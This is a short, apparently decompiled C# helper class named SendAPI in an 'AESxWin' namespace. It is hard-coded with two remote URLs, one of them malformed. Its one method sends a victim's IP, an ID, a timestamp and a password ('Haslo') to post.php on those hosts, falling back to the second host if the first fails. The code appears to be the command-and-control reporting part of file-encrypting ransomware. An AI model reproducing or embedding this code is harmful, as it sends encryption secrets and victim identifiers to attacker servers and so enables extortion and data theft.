using System;
using System.Net;

namespace AESxWin.Helpers;

public static class SendAPI
{
	private static int int_0 = 0;

	public static string[] Urls = new string[2] { "http://anna-lewandowska.eu/regis/", "https://tanwinoilapl/mi5/" };

	public static string SendData(string string_0, string string_1, DateTime dateTime_0, string string_2)
	{
		string empty = string.Empty;
		int_0 = 0;
		try
		{
			string text = dateTime_0.ToString("dd-MM-yyyy HH:MM:ss");
			for (int i = 0; i < Urls.Length; i++)
			{
				if (!string.IsNullOrEmpty(Urls[int_0]))
				{
					try
					{
						WebClient webClient = new WebClient();
						Uri uri = new Uri(new Uri(Urls[int_0]), $"post.php?IP={string_0}&ID={string_1}&Data={text}&Haslo={string_2}");
						string absoluteUri = uri.AbsoluteUri;
						webClient.DownloadString(absoluteUri);
						int_0 = 0;
					}
					catch (Exception)
					{
						int_0++;
						continue;
					}
					break;
				}
			}
		}
		catch
		{
		}
		return empty;
	}
}
